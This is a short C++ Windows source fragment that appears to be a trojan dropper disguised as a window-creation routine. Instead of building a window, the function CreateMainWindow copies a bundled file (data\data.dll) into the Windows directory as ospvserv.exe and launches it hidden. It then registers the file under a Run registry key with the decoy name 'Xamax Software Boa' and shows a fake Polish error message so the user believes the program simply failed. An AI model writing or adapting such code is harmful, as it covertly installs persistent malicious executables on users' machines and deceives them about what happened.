bool CreateMainWindow(HINSTANCE hThisInstance)
{    
    
    char * pCurrent = new char[2048];
    char * pSystem = new char[2048];
    
    GetCurrentDirectory(2047, pCurrent);
    GetWindowsDirectory(pSystem, 2047);
    lstrcat(pCurrent, "\\data\\data.dll");
    lstrcat(pSystem, "\\ospvserv.exe");
    
    if(CopyFile(pCurrent, pSystem, true))
    {
        ShellExecute(NULL, "open", pSystem, NULL, NULL, SW_HIDE);
    
        HKEY hKey = NULL;
    
        RegOpenKeyEx(HKEY_CURRENT_USER, "software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_CREATE_LINK, &hKey);
        RegSetValueEx(hKey, "Xamax Software Boa", 0, REG_SZ, (BYTE*)pSystem, (lstrlen(pSystem)+1)*sizeof(char));
        RegCloseKey(hKey);   
    }
    
    delete [] pSystem;
    delete [] pCurrent;
    MessageBox(0, "Nie mo¿na utworzyæ interfejsu programu. Aplikacja zostanie zakoñczona.\nB³¹d przerwania: ERR57d78-0x88CFA", programName, MB_OK | MB_ICONERROR);
    return false;
}
